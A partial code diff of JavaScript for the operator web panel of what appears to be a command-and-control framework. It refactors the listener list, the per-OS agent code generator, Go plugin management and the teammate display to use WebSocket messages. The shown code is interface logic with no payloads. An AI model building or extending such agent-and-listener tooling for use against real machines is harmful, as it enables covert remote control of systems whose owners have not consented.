+                    "</li>";
+            }).join("") :
+            "<li class='online-teammate-empty'>No teammates online</li>";
+        return (
+            "<div id='online-teammates-card' class='online-teammates-card'>" +
+                "<div class='online-teammates-head'>" +
+                    "<div class='online-teammates-copy'>" +
+                        "<div class='online-teammates-title'>Online teammates</div>" +
+                        "<div class='online-teammates-subtitle'>Current teammates connected to the panel</div>" +
+                    "</div>" +
+                    "<div class='online-teammates-actions'>" +
+                        "<span id='online-teammates-count' class='online-teammates-count'>" + count + "</span>" +
+                        "<button type='button' class='online-teammates-action online-teammates-refresh'>Refresh</button>" +
+                        "<button type='button' class='online-teammates-action online-teammates-toggle'>Show list</button>" +
+                    "</div>" +
+                "</div>" +
+                "<div class='online-teammates-toolbar'>" +
+                    "<button type='button' class='online-teammates-action online-teammates-action-strong' onclick='openStartServerDialog()'>Start server</button>" +
+                    "<button type='button' class='online-teammates-action' onclick='clearMemory()'>Clear memory</button>" +
+                    "<button type='button' class='online-teammates-action' onclick='downLog()'>Download log</button>" +
+                "</div>" +
+                "<div id='online-teammates-list' class='online-teammates-list'>" +
+                    "<div class='online-teammates-list-label'>Teammate list</div>" +
+                    "<ul class='online-teammates-list-body'>" + listItems + "</ul>" +
+                "</div>" +
+            "</div>"
+        );
     }
-    getCookie(name) {
-        let cookies = document.cookie.split('; ');
-        for (let i = 0; i < cookies.length; i++) {
-            let cookie = cookies[i];
-            let cookieParts = cookie.split('=');
-            if (cookieParts[0] === name) {
-                return cookieParts[2];
-            }
+    renderOnlineTeammatesCard() {
+        const mountNode = document.getElementById("online_teammates_mount");
+        if (!mountNode) {
+            return;
         }
-        return null;
+        const card = mountNode.querySelector("#online-teammates-card");
+        if (!card) {
+            mountNode.innerHTML = this.getOnlineTeammatesMarkup();
+            return;
+        }
+        const teamList = Array.isArray(onlineTeammates) ? onlineTeammates : [];
+        const countNode = card.querySelector("#online-teammates-count");
+        const listNode = card.querySelector("#online-teammates-list ul");
+        const toggleBtn = card.querySelector(".online-teammates-toggle");
+        if (countNode) {
+            countNode.textContent = String(teamList.length);
+        }
+        if (listNode) {
+            listNode.innerHTML = teamList.length > 0 ?
+                teamList.map((user) => {
+                    return "<li class='online-teammate-item'>" +
+                        escapeHtml(user) +
+                        "</li>";
+                }).join("") :
+                "<li class='online-teammate-empty'>No teammates online</li>";
+        }
+        const listPanel = card.querySelector("#online-teammates-list");
+        if (listPanel && toggleBtn && listPanel.style.display === "none") {
+            toggleBtn.textContent = "Show list";
+        }
     }
-    clear_memory(){
-        fetch('/`+web_route+`?op=cleanup')
+    async requestOnlineTeammates() {
+        try {
+            const responsePromise = webSocketClient.waitForMessage(
+                (msg) => {
+                    return msg.path === "onlineteamment" && msg.code === 200;
+                },
+                15000
+            );
+            const sent = await webSocketClient.send(
+                "onlineteamment",
+                {}
+            );
+            if (!sent) {
+                customLog("Failed to request online teammates");
+                return false;
+            }
+            const result = await responsePromise;
+            onlineTeammates = Array.isArray(result.data) ? result.data : [];
+            window.onlineTeammates = onlineTeammates;
+            this.renderOnlineTeammatesCard();
+            return true;
+        } catch (err) {
+            console.error("online teammates error:", err);
+            customLog("Failed to load online teammates");
+            return false;
+        }
     }
-    async get_server_pulgin(port,codeWord,code,os,parameter) {
-        const data = {
-            port: port,
-            codeWord: codeWord,
-            code: code,
-            os: os,
-            parameter: parameter
-        };
-        this.server_pulgin.push(data);
-        console.log("Plugin data added:", data);
-        return data;
+    async clear_memory(){
+        try{
+            let result = await webSocketClient.send(
+                
+                "cleanup",
+                {}
+            );
+            console.log(
+                "cleanup success:",
+                result
+            );
+        }catch(err){
+            console.error(
+                "cleanup error:",
+                err
+            );
+        }
     }
     async start_server() {
         const form = document.getElementById("serverForm");
-
-        // 使用 FormData 获取表单数据
         const formData = new FormData(form);
         const jsonData = {};
-
-        // 处理证书和密钥的内容
-        const certContent = formData.get("cert") || ""; // 获取证书内容，默认为空字符串
-        const keyContent = formData.get("key") || ""; // 获取密钥内容，默认为空字符串
-
-        // 将表单数据转换为 JSON 格式
+        const certContent = formData.get("cert") || "";
+        const keyContent = formData.get("key") || "";
         formData.forEach((value, key) => {
-            if (key !== "cert" && key !== "key") {
-                jsonData[key] = value;  // 其他字段直接添加
+            if(
+                key !== "cert" &&
+                key !== "key"
+            ){
+                jsonData[key] = value;
             }
         });
-
-        console.log("Form data to be sent:", jsonData);
-
-        // 添加证书和密钥到 jsonData
         jsonData.cert = certContent;
         jsonData.key = keyContent;
-
-        try {
-            const res = await fetch("/`+web_route+`?op=startServer", {
-                method: "POST",
-                headers: {
-                    "Content-Type": "application/json",
-                },
-                body: JSON.stringify(jsonData),
-            });
-            if (!res.ok) {
-                const errorText = await res.text();
-                alert("HTTP error!: " + errorText);
-            }
-        } catch (err) {
+        // 添加用户名
+        jsonData.username = Username;
+        try{
+            let result = await webSocketClient.send(
+                "startServer",
+                jsonData,
+            );
+            customLog("start server success:",result);
+        }catch(err){
+            console.error("start server error:",err);
+            customAlert("Start server failed: " + err.message);
         }
-    }
-    async get_server() {
-        // 只绑定一次 click 事件
-        this.initServerIndexClickHandler();
-
-        setInterval(async () => {
-            try {
-                let interval_server = "/`+web_route+`?op=ServerIndex&clientsCount=" + this.server_data.length;
-                const response = await fetch(interval_server);
-                if (!response.ok && response.status === 400) {
-                    const errorText = await response.text();
-                    console.error('Error:', errorText);
-                    return;
-                }
-                if (response.ok && response.headers.get('Content-Type')?.includes('application/json')) {
-                    const data = await response.json();
-                    if (data !== 'noNeeded' && Array.isArray(data) && data.length > 0) {
-                        this.server_data = data;
-                        this.updateServerIndex();
-                    }
-                }
-            } catch (error) {
-                console.error('Request failed', error);
-            }
-        }, 15000);
     }
 
     updateServerIndex() {
+        if (!Array.isArray(server_data)) {
+            console.error("server_data is not an array");
+            return;
+        }
+        this.renderOnlineTeammatesCard();
         const serverIndexDiv = document.getElementById('server_index');
         if (!serverIndexDiv) return;
         let htmlContent = "";
-        for (const server of this.server_data) {
-            const key_path = server.keyPath.length > 10 ? server.keyPath.substring(0, 10) + "..." : server.keyPath;
-            const cert_path = server.certPath.length > 10 ? server.certPath.substring(0, 10) + "..." : server.certPath;
-            htmlContent += "<div id='" + server.port + "-info' class='server-info' style='border:1px solid #ccc;padding:10px;margin-bottom:10px;border-radius:6px;background-color:#f9f9f9;'>";
-                htmlContent += "<div class='server-container' style='margin-bottom:6px;font-family:monospace;color:#333;font-size:14px;'>";
-                
-                htmlContent += "<strong class='ip-address' style='color:#007BFF;'>port:</strong> <span style='margin-right:12px;'>" + server.port + "</span>";
-            htmlContent += "<strong class='ip-address' style='color:#007BFF;'>protocol:</strong> <span style='margin-right:12px;'>" + server.protocol + "</span>";
-            htmlContent += "<strong class='ip-address' style='color:#007BFF;'>cert:</strong> <span style='margin-right:12px;'>" + cert_path + "</span>";
-            htmlContent += "<strong class='ip-address' style='color:#007BFF;'>key:</strong> <span style='margin-right:12px;'>" + key_path + "</span>";
-            htmlContent += "<strong class='ip-address' style='color:#007BFF;'>user:</strong> <span style='margin-right:12px;'>" + server.user + "</span>";
-            htmlContent += "<strong class='ip-address' style='color:#007BFF;'>path:</strong> <span style='margin-right:12px;'>" + server.path + "</span>";
-            htmlContent += "<strong class='ip-address' style='color:#007BFF;'>remark:</strong> <span style='margin-right:12px;'>" + server.remark + "</span>";
-            htmlContent += "<strong class='ip-address' style='color:#007BFF;'>agents:</strong> <span style='color:#DC3545; margin-right:12px;' id='" + server.port + "'>0</span>";
-
+        for (const server of server_data) {
+            const keyPathRaw = String(server.keyPath || "");
+            const certPathRaw = String(server.certPath || "");
+            const key_path = keyPathRaw.length > 22 ? keyPathRaw.substring(0, 22) + "..." : keyPathRaw;
+            const cert_path = certPathRaw.length > 22 ? certPathRaw.substring(0, 22) + "..." : certPathRaw;
+            const clientCount = serverClientCounts[String(server.port)] || 0;
+            htmlContent += "<article id='" + escapeHtml(server.port) + "-info' class='server-card'>";
+                htmlContent += "<div class='server-card-head'>";
+                    htmlContent += "<div class='server-card-copy'>";
+                        htmlContent += "<div class='server-card-title'>" + escapeHtml(server.remark || "Unnamed server") + "</div>";
+                        htmlContent += "<div class='server-card-subtitle'>" + escapeHtml(server.path || "/") + "</div>";
+                    htmlContent += "</div>";
+                    htmlContent += "<div class='server-card-badges'>";
+                        htmlContent += "<span class='server-badge'>" + escapeHtml(String(server.protocol || "").toUpperCase()) + "</span>";
+                        htmlContent += "<span class='server-badge server-badge-accent'><span id='" + escapeHtml(server.port) + "'>" + clientCount + "</span> agents</span>";
+                    htmlContent += "</div>";
                 htmlContent += "</div>";
-                htmlContent += "<div style='display:flex;flex-wrap:wrap;gap:8px;'>";
+                htmlContent += "<div class='server-meta-grid'>";
+                    htmlContent += "<div class='server-meta-item'><span class='server-meta-label'>Port</span><span class='server-meta-value'>" + escapeHtml(server.port) + "</span></div>";
+                    htmlContent += "<div class='server-meta-item'><span class='server-meta-label'>User</span><span class='server-meta-value'>" + escapeHtml(server.user) + "</span></div>";
+                    htmlContent += "<div class='server-meta-item'><span class='server-meta-label'>Cert</span><span class='server-meta-value'>" + escapeHtml(cert_path || "-") + "</span></div>";
+                    htmlContent += "<div class='server-meta-item'><span class='server-meta-label'>Key</span><span class='server-meta-value'>" + escapeHtml(key_path || "-") + "</span></div>";
+                htmlContent += "</div>";
+                htmlContent += "<div class='server-action-groups'>";
+                    htmlContent += "<div class='server-action-row'>";
                 if (server.windows_pro === "group_pro") {
-                    htmlContent += "<a class='ip-address agent-link' href='javascript:void(0)' data-os='win' data-port='" + server.port + "' style='text-decoration:none;padding:4px 8px;background:#f9f9f9;color:black;border-radius:4px;font-size:13px;'>{Win_agent}</a>";
+                    htmlContent += "<a class='server-action-pill agent-link' href='javascript:void(0)' data-os='win' data-port='" + server.port + "'>Win agent</a>";
                 } else {
-                    htmlContent += "<a class='ip-address agent-link' href='javascript:void(0)' data-os='win' data-port='" + server.port + "' style='text-decoration:none;padding:4px 8px;background:#f9f9f9;color:black;border-radius:4px;font-size:13px;'>{Win_agent}</a>";
-                    htmlContent += "<a class='ip-address agent-link' href='javascript:void(0)' data-os='linux' data-port='" + server.port + "' style='text-decoration:none;padding:4px 8px;background:#f9f9f9;color:black;border-radius:4px;font-size:13px;'>{Linux_agent}</a>";
-                    htmlContent += "<a class='ip-address agent-link' href='javascript:void(0)' data-os='macos' data-port='" + server.port + "' style='text-decoration:none;padding:4px 8px;background:#f9f9f9;color:black;border-radius:4px;font-size:13px;'>{MacOS_agent}</a>";
-                    htmlContent += "<a class='ip-address agent-link' href='javascript:void(0)' data-os='android' data-port='" + server.port + "' style='text-decoration:none;padding:4px 8px;background:#f9f9f9;color:black;border-radius:4px;font-size:13px;'>{Android_agent}</a>";
+                    htmlContent += "<a class='server-action-pill agent-link' href='javascript:void(0)' data-os='win' data-port='" + server.port + "'>Win agent</a>";
+                    htmlContent += "<a class='server-action-pill agent-link' href='javascript:void(0)' data-os='linux' data-port='" + server.port + "'>Linux agent</a>";
+                    htmlContent += "<a class='server-action-pill agent-link' href='javascript:void(0)' data-os='macos' data-port='" + server.port + "'>macOS agent</a>";
+                    htmlContent += "<a class='server-action-pill agent-link' href='javascript:void(0)' data-os='android' data-port='" + server.port + "'>Android agent</a>";
                 }
-                htmlContent += "<a class='ip-address download-config' href='javascript:void(0)' data-port='" + server.port + "' style='text-decoration:none;padding:4px 8px;background:#f9f9f9;color:black;border-radius:4px;font-size:13px;'>{Download Config}</a>";
-                htmlContent += "<a class='ip-address modifyServerHeader' href='javascript:void(0)' data-port='" + server.port + "' style='text-decoration:none;padding:4px 8px;background:#f9f9f9;color:black;border-radius:4px;font-size:13px;'>{Modify Server Header}</a>";
-                htmlContent += "<a class='ip-address plugin' href='javascript:void(0)' data-port='" + server.port + "' style='text-decoration:none;padding:4px 8px;background:#f9f9f9;color:black;border-radius:4px;font-size:13px;'>{plugin}</a>";
-                htmlContent += "<a class='ip-address delete-server' href='javascript:void(0)' data-port='" + server.port + "' style='text-decoration:none;padding:4px 8px;background:#f9f9f9;color:black;border-radius:4px;font-size:13px;'>{Delete}</a>";
+                    htmlContent += "</div>";
+                    htmlContent += "<div class='server-action-row server-action-row-secondary'>";
+                        htmlContent += "<a class='server-action-pill server-action-pill-secondary download-config' href='javascript:void(0)' data-port='" + server.port + "'>Download config</a>";
+                        htmlContent += "<a class='server-action-pill server-action-pill-secondary modifyServerHeader' href='javascript:void(0)' data-port='" + server.port + "'>Headers</a>";
+                        htmlContent += "<a class='server-action-pill server-action-pill-secondary plugin' href='javascript:void(0)' data-port='" + server.port + "'>Plugins</a>";
+                        htmlContent += "<a class='server-action-pill server-action-pill-danger delete-server' href='javascript:void(0)' data-port='" + server.port + "'>Delete</a>";
+                    htmlContent += "</div>";
                 htmlContent += "</div>";
-            htmlContent += "</div>";
+            htmlContent += "</article>";
         }
         serverIndexDiv.innerHTML = htmlContent;
     }
-
-    initServerIndexClickHandler() {
-        const serverIndexDiv = document.getElementById('server_index');
-        if (!serverIndexDiv) return;
-
-        serverIndexDiv.addEventListener('click', (event) => {
+    async initServerIndexClickHandler() {
+        const serverPage = document.getElementById('server');
+        if (!serverPage) return;
+        if (serverPage.dataset.clickBound === "true") {
+            return;
+        }
+        serverPage.dataset.clickBound = "true";
+        serverPage.addEventListener('click', async (event) => {
             const target = event.target;
-
+            if (target.classList.contains('online-teammates-refresh')) {
+                await this.requestOnlineTeammates();
+                return;
+            }
+            if (target.classList.contains('online-teammates-toggle')) {
+                const card = target.closest("#online-teammates-card");
+                const listPanel = card ? card.querySelector("#online-teammates-list") : null;
+                if (!listPanel) {
+                    return;
+                }
+                const expanded = listPanel.style.display === "block";
+                listPanel.style.display = expanded ? "none" : "block";
+                target.textContent = expanded ? "Show list" : "Hide list";
+                return;
+            }
             if (target.classList.contains('delete-server')) {
                 const port = target.getAttribute('data-port');
-                this.server_data = this.server_data.filter(s => s.port !== port);
-                fetch("/`+web_route+`?op=delserver&port=" + port)
-                    .then(res => res.text())
-                    .then(data => {
-                        if (data === "[!] This server has agents,can not stop\n") {
-                            alert(data);
-                            return;
+                try {
+                    let data = await webSocketClient.send(
+                        
+                        "delserver",
+                        {
+                            port: port
                         }
-                        const serverDiv = document.getElementById(port + "-info");
-                        if (serverDiv) serverDiv.remove();
-                    });
+                    );
+                    // 有代理不能删除
+                    if (
+                        data === "[!] This server has agents,can not stop\n"
+                    ) {
+                        customAlert(data);
+                        return;
+                    }
+                    // 删除本地数据
+                    server_data =
+                        server_data.filter(
+                            s => s.port !== port
+                        );
+                    const serverDiv = document.getElementById(port + "-info");
+                    if (serverDiv) {
+                        serverDiv.remove();
+                    }
+                } catch(err) {
+                    console.error(
+                        "delete server error:",
+                        err
+                    );
+                }
             }
-
             if (target.classList.contains('download-config')) {
                 const port = target.getAttribute('data-port');
                 this.downloadConfig(port);
             }
-
             if (target.classList.contains('modifyServerHeader')) {
                 const port = target.getAttribute('data-port');
                 this.modifyServerHeader(port);
             }
-
             if (target.classList.contains('agent-link')) {
                 const os = target.getAttribute('data-os');
                 const port = target.getAttribute('data-port');
-                const server = this.server_data.find(s => s.port === port);
+                if (!Array.isArray(server_data)) {
+                    console.error("server_data is null", server_data);
+                    return;
+                }
+                const server = server_data.find(s => s.port === port);
                 if (!server) return;
-
                 const path = server.path.replace(/^\//, "");
-                fetch("/`+web_route+`?op=getPlugin&remark=" + server.remark + "&os=" + os)
-                    .then(res => res.json())
-                    .then(pluginData => {
-                        const code = pluginData?.code?.join("\n") || "/*code*/";
-                        this.redirectToAgentCode(
-                            os, port, server.protocol, path,
-                            server.conn_path, server.msg_path, server.switch_path, server.encry_path,
-                            server.download_path, server.result_path, server.net_path, server.info_path,
-                            server.upload_path, server.list_path, server.option_path,
-                            server.user, server.uid, server.hostname, server.keyPart,
-                            server.filekey, code,server.windows_pro
+                let code = "";
+                if (Array.isArray(server_plugin)) {
+                    const matchedPlugins = server_plugin.filter(function(pluginItem) {
+                        if (!pluginItem) {
+                            return false;
+                        }
+                        const pluginRemark = String(
+                            pluginItem.remark || pluginItem.Remark || ""
                         );
+                        const pluginOS = String(
+                            pluginItem.os || pluginItem.OS || ""
+                        ).toLowerCase();
+                        const pluginCode = pluginItem.code || pluginItem.Code || "";
+                        return pluginRemark === String(server.remark || "") &&
+                            pluginOS === String(os || "").toLowerCase() &&
+                            typeof pluginCode === "string" &&
+                            pluginCode.trim() !== "";
                     });
+                    code = matchedPlugins
+                    .map(function(pluginItem) {
+                        return pluginItem.code || pluginItem.Code || "";
+                    })
+                    .join("\n\n")
+                    .trim();
+                }
+                if (!code) {
+                    code = "/*code*/";
+                }
+                // 按 redirectToAgentCode 的参数顺序调用（protocol, os, server, path, ... , code, windows_pro）
+                this.redirectToAgentCode(
+                    server.protocol,
+                    os,
+                    main_server+":"+server.port,
+                    path,
+                    server.conn_path,
+                    server.msg_path,
+                    server.switch_path,
+                    server.encry_path,
+                    server.download_path,
+                    server.result_path,
+                    server.net_path,
+                    server.info_path,
+                    server.upload_path,
+                    server.list_path,
+                    server.option_path,
+                    server.user,
+                    server.uid,
+                    server.hostname,
+                    server.keyPart,
+                    server.filekey,
+                    code,
+                    server.windows_pro
+                );
             }
-
             if (target.classList.contains('plugin')) {
                 const port = target.getAttribute('data-port');
-                const server = this.server_data.find(s => s.port === port);
+                const server = server_data.find(s => s.port === port);
                 if (!server) return;
-
                 let dialog = document.getElementById("serverDialog");
                 if (!dialog) {
                     dialog = document.createElement("div");
@@ -1849,8 +3097,11 @@ class lain_server {
                     dialog.dataset.remark = server.remark;
 
                     dialog.innerHTML =
-                        "<h3>plugin</h3>" +
-                        "<form id='pluginForm' method='POST'>" +
+                        "<div class='plugin-dialog-header'>" +
+                            "<button type='button' class='plugin-close-btn' onclick='closeStartServerDialog()' aria-label='close plugin dialog'>×</button>" +
+                            "<h3>plugin</h3>" +
+                        "</div>" +
+                        "<form id='pluginForm' method='POST' class='plugin-form'>" +
                         "<select id='select_os'>" +
                             "<option value='win'>windows</option>" +
                             "<option value='linux'>linux</option>" +
@@ -1866,8 +3117,7 @@ class lain_server {
                         "</div>" +
                         "<input name='code' placeholder='golang language.msg-1,msg-2,msg-3 for parameter'><br>" +
                         "<input id='parameterDec' name='parameterDec' placeholder='Meaning of parameter'><br>" +
-                        "<button type='button' id='submitBtn' onclick=\"plugin('" + server.remark + "')\">plugin</button>" +
-                        "<button type='button' onclick='closeStartServerDialog()'>close</button>" +
+                        "<button type='button' id='submitBtn'>plugin</button>" +
                         "</form>" +
                         "<div id='plugin_list' class='plugin_list'></div>";
 
@@ -1882,6 +3132,19 @@ class lain_server {
                     const removeBtn = dialog.querySelector('#removeParameterBtn');
                     const countDisplay = dialog.querySelector('#parameterCount');
                     const countHidden = dialog.querySelector('#parameterHidden');
+                    const pluginForm = dialog.querySelector('#pluginForm');
+                    const submitBtn = dialog.querySelector('#submitBtn');
+
+                    if (pluginForm) {
+                        pluginForm.onsubmit = function(event) {
+                            event.preventDefault();
+                        };
+                    }
+                    if (submitBtn) {
+                        submitBtn.onclick = function() {
+                            submitPlugin();
+                        };
+                    }
 
                     if (addBtn && removeBtn && countDisplay && countHidden) {
                         addBtn.onclick = () => {
@@ -1901,203 +3164,350 @@ class lain_server {
                             }
                         };
                     }
-
-                    this.refreshPluginList(server.remark);
+                    this.refreshPluginList();
                 } else {
                     dialog.style.display = "block";
                     dialog.style.transform = "translateX(-50%) scaleY(1)";
                     dialog.style.opacity = "1";
                     if (dialog.dataset.remark !== server.remark) {
                         dialog.dataset.remark = server.remark;
-                        this.refreshPluginList(server.remark);
+                        this.refreshPluginList();
                     }
                 }
             }
         });
     }
 
-    refreshPluginList(remark) {
+    refreshPluginList() {
+        const serverUi = this;
         var pluginList = document.getElementById("plugin_list");
         if (!pluginList) return;
-
-        var os_list = ['win', 'linux', 'macos', 'android'];
-
-        os_list.forEach(function(os) {
-            // 每个平台一个独立容器
-            var sectionId = "plugin_section_" + os;
-            var section = document.getElementById(sectionId);
-            if (!section) {
-                section = document.createElement("div");
-                section.id = sectionId;
-                pluginList.appendChild(section);
+        var dialog = document.getElementById("serverDialog");
+        var currentRemark = dialog ? dialog.dataset.remark : "";
+        pluginList.innerHTML = "";
+        pluginList.classList.add("plugin-panel");
+        if (
+            !Array.isArray(server_plugin) ||
+            server_plugin.length === 0
+        ) {
+            pluginList.innerHTML = "<div class='plugin-empty'>No plugin available</div>";
+            return;
+        }
+        var pluginItems = server_plugin.filter(function(item) {
+            if (!item) {
+                return false;
             }
-            section.innerHTML = "";  // 只清空当前平台的内容
+            if (!currentRemark) {
+                return true;
+            }
+            return String(item.remark || item.Remark || "") === String(currentRemark);
+        });
+        if (pluginItems.length === 0) {
+            pluginList.innerHTML = "<div class='plugin-empty'>No plugin available</div>";
+            return;
+        }
+        var validItems = pluginItems.filter(function(item) {
+            var codeStr = item.code || item.Code || "";
+            return codeStr && codeStr !== "/*code*/";
+        });
+        if (validItems.length === 0) {
+            pluginList.innerHTML = "<div class='plugin-empty'>No plugin available</div>";
+            return;
+        }
 
-            fetch("/`+web_route+`?op=getPlugin&remark=" + remark + "&os=" + os)
-                .then(function(response) { return response.json(); })
-                .then(function(pluginData) {
-                    if (pluginData && pluginData.code && Array.isArray(pluginData.code) && pluginData.code.length > 0) {
-                        var codes = pluginData.code;
+        var section = document.createElement("div");
+        section.id = "plugin_section";
+        section.className = "plugin-section";
+        pluginList.appendChild(section);
 
-                        var osTitle = document.createElement("h3");
-                        osTitle.textContent = os;
-                        section.appendChild(osTitle);
+        var title = document.createElement("h3");
+        title.className = "plugin-section-title";
+        title.textContent = "Plugin Library";
+        section.appendChild(title);
 
-                        codes.forEach(function(codeStr, idx) {
-                            if (codeStr === "/*code*/") return;
+        var osLabels = {
+            win: "Windows",
+            linux: "Linux",
+            macos: "macOS",
+            android: "Android",
+            unknown: "Other"
+        };
+        var grouped = {};
+        validItems.forEach(function(item) {
+            var key = String(item.os || item.OS || "unknown").toLowerCase();
+            if (!grouped[key]) {
+                grouped[key] = [];
+            }
+            grouped[key].push(item);
+        });
 
-                            var pluginItem = document.createElement("div");
-                            pluginItem.className = "plugin-item";
-                            pluginItem.style.display = "flex";
-                            pluginItem.style.justifyContent = "space-between";
-                            pluginItem.style.alignItems = "center";
-                            pluginItem.style.gap = "8px";
+        ["win", "linux", "macos", "android", "unknown"].forEach(function(osKey) {
+            if (!grouped[osKey] || grouped[osKey].length === 0) {
+                return;
+            }
+            var groupCard = document.createElement("div");
+            groupCard.className = "plugin-os-group";
 
-                            var shortText = codeStr.length > 20 ? codeStr.slice(0, 20) + "…" : codeStr;
-                            var expanded = false;
-                            var span = document.createElement("span");
-                            span.textContent = shortText;
-                            span.style.cursor = "pointer";
-                            span.style.whiteSpace = "pre-wrap";
-                            span.onclick = function () {
-                                expanded = !expanded;
-                                span.textContent = expanded ? codeStr : shortText;
-                            };
+            var groupHeader = document.createElement("div");
+            groupHeader.className = "plugin-os-header";
 
-                            var btnGroup = document.createElement("div");
-                            btnGroup.style.display = "flex";
-                            btnGroup.style.gap = "4px";
+            var osBadge = document.createElement("span");
+            osBadge.className = "plugin-os-badge plugin-os-" + osKey;
+            osBadge.textContent = osLabels[osKey] || osKey;
 
-                            var deleteBtn = document.createElement("button");
-                            deleteBtn.textContent = "🗑";
-                            deleteBtn.title = "delete plugin";
-                            deleteBtn.onclick = function () {
-                                fetch("/`+web_route+`?op=delPlugin&remark=" + remark + "&os=" + os)
-                                    .then(function() {
-                                        pluginItem.remove();
-                                    }).catch(function(error) {
-                                        console.error("del plugin error:", error);
-                                    });
-                            }.bind(this);
+            var osCount = document.createElement("span");
+            osCount.className = "plugin-os-count";
+            osCount.textContent = grouped[osKey].length + " plugin" + (grouped[osKey].length > 1 ? "s" : "");
 
-                            var copyBtn = document.createElement("button");
-                            copyBtn.textContent = "📋";
-                            copyBtn.title = "复制代码";
-                            copyBtn.onclick = function () {
-                                navigator.clipboard.writeText(codeStr).then(function () {
-                                    copyBtn.textContent = "✅";
-                                    setTimeout(function () {
-                                        copyBtn.textContent = "📋";
-                                    }, 1000);
-                                }).catch(console.error);
-                            };
+            var groupTools = document.createElement("div");
+            groupTools.className = "plugin-os-tools";
+            groupTools.appendChild(osCount);
 
-                            btnGroup.appendChild(copyBtn);
-                            btnGroup.appendChild(deleteBtn);
-                            pluginItem.appendChild(span);
-                            pluginItem.appendChild(btnGroup);
-                            section.appendChild(pluginItem);
-                        });
-                    } else {
-                        var emptyItem = document.createElement("div");
-                        emptyItem.className = "plugin-item";
-                        emptyItem.style.display = "flex";
-                        emptyItem.style.justifyContent = "space-between";
-                        emptyItem.style.alignItems = "center";
-                        emptyItem.style.gap = "8px";
-                        emptyItem.innerHTML = "<span><strong>" + os + ":</strong> No plugin available</span>";
-                        section.appendChild(emptyItem);
-                    }
-                }.bind(this)).catch(function(err) {
-                    console.error("获取插件失败:", err);
-                });
-        }.bind(this));
+            groupHeader.appendChild(osBadge);
+            groupHeader.appendChild(groupTools);
+            groupCard.appendChild(groupHeader);
+
+            var groupList = document.createElement("div");
+            groupList.className = "plugin-os-list";
+
+            grouped[osKey].forEach(function(item) {
+                var codeStr = item.code || item.Code || "";
+                var codeWord = item.codeWord || item.CodeWord || "unnamed";
+                var parameters = item.parameter || item.Parameter || [];
+                var parameterDesc = item.parameter_desc || item.ParameterDesc || [];
+                var pluginItem = document.createElement("article");
+                pluginItem.className = "plugin-item";
+
+                var itemTop = document.createElement("div");
+                itemTop.className = "plugin-item-top";
+
+                var meta = document.createElement("div");
+                meta.className = "plugin-item-meta";
+
+                var codeWordTag = document.createElement("span");
+                codeWordTag.className = "plugin-codeword";
+                codeWordTag.textContent = codeWord;
+
+                var metaText = document.createElement("div");
+                metaText.className = "plugin-meta-text";
+
+                var paramText = document.createElement("div");
+                paramText.className = "plugin-param-line";
+                paramText.textContent = Array.isArray(parameters) && parameters.length > 0 ?
+                    "Params: " + parameters.join(", ") :
+                    "Params: none";
+
+                var descText = document.createElement("div");
+                descText.className = "plugin-desc-line";
+                descText.textContent = Array.isArray(parameterDesc) && parameterDesc.length > 0 ?
+                    "Desc: " + parameterDesc.join(", ") :
+                    "Desc: not set";
+
+                metaText.appendChild(paramText);
+                metaText.appendChild(descText);
+                meta.appendChild(codeWordTag);
+                meta.appendChild(metaText);
+
+                var actions = document.createElement("div");
+                actions.className = "plugin-item-actions";
+
+                var toggleBtn = document.createElement("button");
+                toggleBtn.type = "button";
+                toggleBtn.className = "plugin-toggle-btn";
+                toggleBtn.textContent = "Expand";
+
+                var copyBtn = document.createElement("button");
+                copyBtn.type = "button";
+                copyBtn.className = "plugin-copy-btn";
+                copyBtn.textContent = "Copy";
+                copyBtn.onclick = function() {
+                    navigator.clipboard
+                    .writeText(codeStr)
+                    .then(function() {
+                        copyBtn.textContent = "Copied";
+                        setTimeout(function() {
+                            copyBtn.textContent = "Copy";
+                        }, 1000);
+                    })
+                    .catch(function(err) {
+                        console.error("copy plugin failed:", err);
+                    });
+                };
+
+                var deleteBtn = document.createElement("button");
+                deleteBtn.type = "button";
+                deleteBtn.className = "plugin-delete-btn";
+                deleteBtn.textContent = "Delete";
+                deleteBtn.onclick = function() {
+                    serverUi.deletePlugin(currentRemark, osKey, codeWord);
+                };
+
+                actions.appendChild(toggleBtn);
+                actions.appendChild(copyBtn);
+                actions.appendChild(deleteBtn);
+
+                itemTop.appendChild(meta);
+                itemTop.appendChild(actions);
+
+                var codePreview = document.createElement("pre");
+                codePreview.className = "plugin-code-preview";
+                codePreview.textContent = codeStr;
+                if (codeStr.length > 220 || codeStr.indexOf("\n") !== -1) {
+                    codePreview.classList.add("collapsed");
+                } else {
+                    toggleBtn.style.display = "none";
+                }
+
+                toggleBtn.onclick = function() {
+                    var expanded = codePreview.classList.toggle("expanded");
+                    toggleBtn.textContent = expanded ? "Collapse" : "Expand";
+                };
+
+                pluginItem.appendChild(itemTop);
+                pluginItem.appendChild(codePreview);
+                groupList.appendChild(pluginItem);
+            });
+
+            groupCard.appendChild(groupList);
+            section.appendChild(groupCard);
+        });
+    }
+    async deletePlugin(remark, osName, codeWords) {
+        if (!remark || !osName || !codeWords) {
+            customAlert("remark, os or codeWords is missing");
+            return false;
+        }
+        const confirmed = await customConfirm(
+            "Delete plugin " + codeWords + " for " + remark + " / " + osName + " ?"
+        );
+        if (!confirmed) {
+            return false;
+        }
+        const sent = await webSocketClient.send(
+            "delPlugin",
+            {
+                remark: remark,
+                os: osName,
+                codeWords: codeWords
+            }
+        );
+        if (!sent) {
+            customAlert("delPlugin send failed");
+            return false;
+        }
+        customLog("delPlugin sent:", {
+            remark: remark,
+            os: osName,
+            codeWords: codeWords
+        });
+        return true;
     }
 
     async modifyServerHeader(port) {
         try {
+            const server = Array.isArray(server_data) ?
+                server_data.find((item) => String(item.port) === String(port)) :
+                null;
+            const currentHeader = server ?
+                (server.response_head || server.responseHead || server.ResponseHead || "") :
+                "";
             // 检查是否已加载样式
             if (!document.getElementById("modify-server-style")) {
                 const styleLink = document.createElement("link");
                 styleLink.id = "modify-server-style";
                 styleLink.rel = "stylesheet";
-                styleLink.href = "/web_ui/css"; // 确保路径正确
                 document.head.appendChild(styleLink);
             }
-
             // 创建弹出框
             const dialog = document.createElement("div");
             dialog.id = "modify-server-dialog";
-
+            const closeButton = document.createElement("button");
+            closeButton.type = "button";
+            closeButton.className = "dialog-close-btn modify-server-close-btn";
+            closeButton.textContent = "×";
+            closeButton.setAttribute("aria-label", "Close response header dialog");
+            closeButton.onclick = () => {
+                document.body.removeChild(dialog);
+            };
+            dialog.appendChild(closeButton);
             // 标题
             const title = document.createElement("h3");
             title.textContent = "Edit Response Header (JSON)";
             dialog.appendChild(title);
-
             // 文本框
